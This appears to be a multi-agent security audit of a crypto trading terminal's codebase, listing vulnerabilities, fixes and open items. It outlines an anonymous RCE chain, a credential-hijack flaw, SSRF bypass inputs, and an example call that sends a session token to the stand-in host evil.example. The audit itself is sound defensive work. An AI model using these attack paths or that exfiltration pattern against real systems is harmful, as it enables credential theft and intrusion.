# Security & architecture audit — July 2026

18 parallel agents audited disjoint slices of the repo, then fixed a first wave of
findings. This document records **what was found and why it matters**, so the
reasoning survives even where the fix hasn't landed yet.

Status legend: **[FIXED]** applied in the working tree · **[OPEN]** not fixed ·
**[PARTIAL]** partially applied.

Findings confirmed by two or more agents reaching them from different entry
points are marked **(×N)**. Those are the highest-confidence items.

---

## 1. Critical

### 1.1 Anonymous RCE chain **[PARTIAL]**

No single slice owned this. Three agents each found one link:

```
POST /api/auth/register        open, gate-exempt, no invite, no rate limit
  → no privilege tiers exist: any authenticated principal is root
  → POST /api/modules/install  gated only by startsWith('/api/')
  → bun add <attacker pkg> + await import()  in-process, unsandboxed
  → reads AUTH_INTERNAL_SECRET
  → fetchCredentials() for every user's exchange keys
```

`routes/auth.ts:22` · `routes/modules.ts:62-74` · `modules/manager.ts:255`

Two independent breaks were attempted: `ALLOW_REGISTRATION` (default off) and an
operator-only `MODULES_ADMIN_TOKEN` on module write routes. Verify both before
trusting this closed. **The unsandboxed in-process `import()` is unchanged** —
that is a design change (worker/subprocess + RPC context), deliberately not
patched.

### 1.2 ccxt instance cache — cross-user credential hijack (×2) **[FIXED]**

`services/ccxtCache.ts:63-72`. The cache key truncated the API key to 8 characters
and **omitted the secret entirely**:

```
bingx:spot:regular:live:<apiKey[0..8]>
```

Supplying a victim's 8-char prefix plus any garbage secret returned their
fully-authenticated exchange instance. Orders executed on their account.
Exchanges display keys as first-8-plus-ellipsis, so the prefix is low-entropy.

Reachable unauthenticated via the Socket.IO `subscribe` handler with
`dataType: 'balance'` and a client-supplied `config`.

Fixed: SHA-256 over the full `apiKey + secret + password` tuple, each field
length-prefixed so `('ab','c')` and `('a','bc')` cannot collide, namespaced by
userId. Regression guard proven by replaying the pre-fix function against the new
tests — both parties produced identical key `binance:spot:regular:live:AKIAJ7QX`.

`userId` threading is **inert today** — no call site passes it. The hijack is
closed by the full-tuple hash; the namespace is defense-in-depth awaiting four
call sites (`ccxtProvider.ts:27`, `routes/websocket.ts:31-68`, `index.ts:224`,
`modules/context.ts:186`, plus `ProviderRequestConfig` in
`packages/types/src/serverProviderContract.ts:39`).

### 1.3 Order execution — four independent ways to send a wrong order **[PARTIAL]**

All in the click-to-order path. Three produce a wrong-sized or wrong-sided **real
order** rather than an error.

1. **Double-submit.** `OrderForm.tsx:265-285`. `handleSubmit` guards on
   `isSubmitting`, but `setSubmitting(true)` happens inside `placeOrder`, which
   runs 100ms later via `setTimeout`. `updateFormData` clears `validationErrors`,
   re-enabling the button. Two clicks inside 100ms = two market orders.
2. **Wrong side.** Same timeout. Side round-trips through the store and is read
   back fresh. Buy at t=0, Sell at t=50ms → both timers fire after the store holds
   `side='sell'` → two SELLs, no BUY. On spot holding 1 BTC that is a 2×
   unintended sell.
3. **Tick size is not a tick size.** `orderExecutionService.ts:248` treats
   `precision.amount` as a step. ccxt has exchanges on `SIGNIFICANT_DIGITS` —
   verified in the installed tree, `node_modules/ccxt/js/src/bitfinex.js:696` sets
   `precision.amount = 8`. Bitfinex is first-class supported
   (`exchangeLimits.ts:91`). One "+" click takes amount 0 → **8 BTC**, and
   `<input step={8}>` spins in 8-BTC increments. **[OPEN]** — correct fix is
   server-side normalization via `amountToPrecision()` where the ccxt instance
   lives.
4. **Nothing is rounded; `minNotional` is dead code.** `placeOrderStore.ts:185-264`
   submits amount and price exactly as typed. `constraints.minNotional` is fetched
   at `orderExecutionService.ts:245` and referenced nowhere.

Plus: balance check used the **quote** balance for both sides
(`placeOrderStore.ts:243-253`); no `clientOrderId` anywhere, so no idempotency key
and the exchange cannot dedupe a retry; `success: true` returned regardless of
`ccxtOrder.status`; SL/TP failures only `console.warn`'d while the response says
success, so users believe they have a stop that does not exist.

### 1.4 Live exchange credentials baked into the Docker image **[FIXED]**

`Dockerfile:15` was `COPY . .` with **no `.dockerignore`**. The gitignored root
`.env` — 14 live values: BingX key+secret ×2 accounts, Bybit key+secret, KuCoin
spot and futures broker HMAC keys, `MM_LOGIN`/`MM_PASS` — was copied into an image
layer. Extractable with `docker save`.

Fixed by adding `.dockerignore`. **This does nothing about images already built
and pushed. Those credentials must be rotated.**

### 1.5 Third-party script with token access (×2) **[FIXED]**

`packages/client/index.html:14` loaded `https://cdn.gpteng.co/gptengineer.js` —
leftover Lovable scaffolding, not dev-gated, surviving into every build. With no
CSP anywhere, it could read `profitmaker.sso.sessions` (all JWTs), read
`data-provider-store` (server token), and hook `fetch` to capture plaintext
`api_key`/`api_secret`/`passphrase` at the moment they were POSTed.

`dist/` is **not** committed (verified: `git ls-files | grep dist/` → 0), so the
vector was the tracked source, regenerating into each build.

### 1.6 Module token exfiltration **[FIXED]**

`modules/api.ts:62-72`. `moduleFetch` attached the session Bearer token to **any**
absolute URL. `terminal.api.fetch('https://evil.example/x')` shipped the credential
authorizing the entire `/api/*` surface.

Fixed by rejecting cross-origin targets outright rather than stripping the header —
a module with a legitimate third-party need can use global `fetch`, and hard
failure surfaces the mistake. Test proven to bite by short-circuiting the guard:
exactly the 6 cross-origin cases fail, the 4 same-origin ones still pass.

## 2. High

### 2.1 `API_TOKEN` defaults to a public literal (×4) **[FIXED]**

`index.ts:40` and `middleware/requireUser.ts:6` both did
`process.env.API_TOKEN || 'your-secret-token'`. The literal is in a public repo.
Unset the env var and anyone sending it authenticates as the bootstrap user, which
owns all locally-created rows — collapsing every ownership check in the codebase
and promoting every authenticated-only finding to unauthenticated.

Four agents flagged it independently. Fixed via a single shared module with no
fallback; an unset token now **disables** the auth path rather than opening it.

### 2.2 Futures orders silently route to spot (×2) **[FIXED]**

`ccxtCache.ts:114-118` set `instanceConfig.defaultType`, but ccxt reads
`this.options.defaultType` (verified at `binance.js:2787`). `marketType: 'futures'`
was a no-op — spot balances, spot order routing, no error. `'swap'` unmapped
entirely. This is a money bug, not a display bug.

### 2.3 Every subscription leaks a permanent watch loop **[FIXED]**

Server assigns `subscriptionId = ${socket.id}:${key}`; client emitted the bare
`key` (`ccxtServerProvider.ts:342`). Server lookup missed → `stopWebSocketSubscription`
no-op → `setTimeout(watchData, 0)` loop ran forever. Every symbol change and widget
close burned an upstream exchange stream. Binance caps at 1024 streams per
connection — this ends at a wall, not gradual degradation.

Three related defects fixed in the same path: the ack handler removed the wrong
listener function, leaking `subscriptionErrorHandler` on every successful
subscribe; the reject path left listeners attached and a stale map entry; data
handlers matched with a substring test.

**Still open:** nothing calls `close()`/`unWatch` on the exchange side. Needs
subscription refcounting — the same machinery that would let LRU eviction know an
instance still has live subscribers.

### 2.4 One invalid widget discards every saved dashboard **[OPEN]**

`dashboardStore.ts:511-518`. `merge` runs `DashboardStoreStateSchema.parse()` over
the **entire** persisted blob and `catch { return current }`, then
`onRehydrateStorage` seeds a fresh default.

The producer is reachable: `dashboardStore.ts:300-315` writes via raw
`Object.assign` with no schema check, and the `updateConfig` prop handed to every
widget spreads arbitrary third-party values into `widget.config`, typed
`z.record(z.any())` — which rejects `null`. **Any module can wipe every layout the
user has.**

Fix both ends: validate the patch with `WidgetSchema.partial()` on write, and make
`merge` per-dashboard/per-widget so one bad widget drops only itself.

### 2.5 No error boundary on the widget render path (×3) **[FIXED]**

`TradingTerminal.tsx:145-158` rendered widgets bare; only 5 of ~30 self-wrapped. A
throw in Chart, Portfolio or OrderForm blanked the entire terminal — including any
open order form. In a money app that is the difference between "one widget broke"
and "I can't cancel my order."

App-level backstop now mounted. Per-widget boundaries keyed by `widget.id` are
still worth adding.

### 2.6 SSO tokens accepted with no `aud` and optional `exp` **[FIXED]**

`ssoAuth.ts:89-96`. `jwtVerify` validated `exp` only when present and `issuer` was
opt-in. **A token with no `exp` was valid forever.** Any RS256 token that key ever
signed — refresh token, email-verification token, a sibling service's token — was
accepted as a terminal access token.

Also `REQUIRED_SERVICE` defaulted to `''`, so the role gate at `:99` never fired:
anyone with an account on any `*.marketmaker.cc` product was auto-provisioned a
terminal account on first request.

Client side, `sessionManager.ts:71` had the mirror bug. Fixed with a **clamp**
rather than fail-closed: an absent `exp` bounds the lifetime to `addedAt + 24h`
(fixing "valid forever") while degrading gracefully; a *malformed* `exp` fails
closed, as does a corrupt `addedAt` — without that guard `NaN + TTL <= now()` is
`false` and the token becomes immortal through the back door.

### 2.7 semver implementation is broken **[FIXED]**

`modules/semver.ts`, verified by executing it:
`satisfies('1.0.0','^1.0.0 || ^2.0.0')` → **false**. Every OR range was
unsatisfiable. Also wrong: `1.x`, `1.2.x`, hyphen ranges, `^0.0.z`, and `>= 1.0.0`
with a space (passed only by accident). Replaced with the `semver` package.

## 3. Medium — recorded, not fixed

- **No migrations existed.** `drizzle/` absent, prod reached schema via
  `drizzle-kit push` on every container start — auto-diffs against the live DB,
  can drop columns, no review, no rollback. Initial migration now generated.
- **Not one FK column is indexed.** Confirmed by the generated migration printing
  `0 indexes` for all 9 tables. Every list endpoint sequential-scans.
- **No transactions anywhere.** `defaultDashboard.ts:46-98` does 10+ sequential
  inserts for a new user; a failure at line 80 leaves them permanently
  half-provisioned with no repair path.
- **`exchange_accounts` is a dead table asserting a guarantee no code provides** —
  `key_encrypted`/`secret_encrypted`/`password_encrypted` + `is_encrypted` default
  `true`, zero references, and **no server-side crypto exists at all**
  (`createCipheriv`/`scrypt`/`pbkdf2` → zero hits under `packages/server`). Whoever
  wires it up inherits a column named `secret_encrypted` and writes plaintext.
  **Decide before the first migration is committed** — dropping it later costs a
  drop migration.
- **Provider id squatting.** `dataProviders.id` is a global client-supplied PK and
  the default is guessable: `primary-server-${userId.slice(0,8)}`. Pre-insert it
  and the victim's bootstrap silently `onConflictDoNothing`s — they end up with no
  data provider and no error.
- **syncBridge has no awareness of SSO identity switch.** Socket authenticates once
  at connect; after a switch you are still in identity A's room holding A's
  dashboards, writing A's row ids with B's token. 404s swallowed. Also: both
  `authenticated` and `reconnect` call `hydrate()`, and two concurrent hydrates on
  an empty server can both enter `importLocalToServer()` → duplicated dashboards.
- **`WidgetSimple.tsx` binds `onMouseDown` only** — no pointer/touch events
  anywhere. Widgets cannot be moved or resized on any touch device.
- **Whole-store subscriptions (×3).** ~20 components do
  `useDataProviderStore()` with no selector, so every market tick re-renders
  charts, portfolio and all settings panels. The worst offender is
  `InstrumentHeaderControl`, which renders in *every* widget header. **This pattern
  is documented as recommended usage in `store/README.md:82-86`** — fix the README
  or it regenerates with every new widget.
- **`OrderBookWidget.tsx:316,364`** declares its virtualizer components inside the
  render body, so React remounts both subtrees every tick. The virtualization is
  paid for and delivers nothing.
- **`Chart.tsx:570`** recreates the NightVision instance on resize while the
  infinite-scroll listener is registered in an effect that never re-runs on
  dimension change — after the first resize, infinite scroll is permanently dead
  and cleanup calls `.off` on an orphaned instance.
- **Unbounded candle arrays.** Trades are capped at 1000
  (`dataActions.ts:393`); candles have no equivalent and are fully re-sorted every
  tick.
- **`stateEvents.revByUser` is in-process.** Add a second replica and revisions
  restart at 1; clients drop every subsequent event (`syncBridge.ts:293`) until
  reload. Silent permanent desync.
- **Module Socket.IO namespaces `io.of('/m/<id>')` have no authentication** — the
  `authenticate` handler is only on the root namespace.
- **Module provider shadowing.** Built-in ccxt is priority 100 and
  `registry.ts:79` sorts **ascending**, so a module registering priority 1 with
  `supportedExchanges: '*'` silently becomes the default provider for every user
  and receives decrypted credentials.
- **`manager.ts:533` `safeJoin` compares path strings without `realpath`** — a
  tarball symlink passes, and `/modules/:id/assets/*` is served unauthenticated:
  an anonymous arbitrary-file-read primitive.
- **CLI scaffold is broken end to end.** `bun install` on a fresh scaffold fails —
  `workspace:*` is never rewritten — and `files: ["src"]` ships no templates, so an
  npm-installed CLI cannot scaffold at all. For a project whose thesis is a
  third-party module ecosystem, the first command a module developer runs does not
  work.
- **`sdk`/`types`/`cli`/`mcp` have no `scripts` block** — none of the platform's
  own contract surface is typechecked, linted or tested by CI.
- **`hono` is imported in `routes/exchange.ts` but declared in no package.json** —
  resolves only by hoisting accident, in the highest-risk route file. (The server is
  Elysia; `hono` appears in exactly one file.)
- **KEYS.md describes a different product** — claims keys live in
  `private/keys.json` in cleartext with a safe/notSafe/danger triad and
  kupi.network branding. Reality: `routes/accounts.ts` proxies to
  `auth.marketmaker.cc` and stores nothing locally. For an open-source trading
  terminal this file *is* the threat model users read before trusting it.

## 4. What is genuinely good

Recorded because it is load-bearing and should not be "refactored" away:

- **The central-accounts credential design.** Keys never reach the browser.
  `required === 'trade'` cannot be downgraded by the request body
  (`routes/exchange.ts:120`), read-only grants are refused server-side
  (`authAccounts.ts:172`), the 60s credential cache is user-scoped, and
  `X-Internal-Secret` never touches the user plane — asserted by a test, not just
  claimed. This is the hard part of a hosted money app and it is already done.
- **SSRF defence in `proxy.ts`.** Pre-flight DNS resolution with address pinning
  via the `lookup` hook closes the classic rebinding TOCTOU. Attempted bypasses
  `[0:0:0:0:0:ffff:127.0.0.1]`, `2130706433`, `0177.0.0.1` — all blocked.
- **Account-takeover prevention.** `resolveSsoUser` keys on `users.sso_user_id`,
  refuses the ambiguous case outright, and guards the first-time bind with
  `isNull(users.ssoUserId)` so a concurrent bind cannot overwrite. The reasoning is
  recorded in a comment at `db/schema/users.ts:13`.
- **argv-injection hardening on `bun add`** — strict leading-character grammar,
  validation before any spawn, `--` end-of-options, and re-validation of the
  persisted `npmName` in case `modules.json` was tampered with.
- **The provider-contract asymmetry is documented with reasons**
  (`serverProviderContract.ts:12-35`) rather than papered over — it stops the next
  reader from "fixing" it.
- **`accountStore.test.ts:143-147`** asserts secrets stay out of the browser the
  right way: by serializing actual store state and checking the key material is
  absent, rather than trusting the code path.

## 5. Method note

Findings above are line-level and were verified by reading code, not inferred.
Several claims were **refuted** during the audit and are recorded as such, because
a corrected claim is worth more than a confidently wrong one:

- The duplicated `orders.ts` does **not** cause TS to silently pick the stale
  definition — they are distinct modules; importing both is a duplicate-identifier
  error, and no current import site resolves to the stale copy. Real drift, latent
  trap, not an active bug.
- Manifest `permissions` being unenforced is **documented as declarative** in three
  places and *is* consumed (rendered as badges). It does what it claims. The
  residual concern is that the vocabulary implies a security boundary that does not
  exist.
- `DebugUserData.tsx` leaks nothing (renders `Has API Key: Yes/No` booleans) and is
  not mounted; `ExchangesWidget.tsx` has no key entry — the real entry point is
  `AddAccountSheet` in `UserDrawer.tsx`.
- Markets/Pairs/Exchanges widgets are registered behind `import.meta.env.DEV` as
  diagnostics and are **not in production builds**, so "users click pairs and
  nothing happens" was wrong. The related keyless-data gate in
  `InstrumentHeaderControl` is real.
- The client "websocket" mode calling `watchX` with no `onData` is **tested as
  intended behavior** (`ccxtServerProvider.test.ts`). The bug is that
  `fetchingActions` calls it in a `while(true)` with no delay, not that the
  one-shot fallback exists.
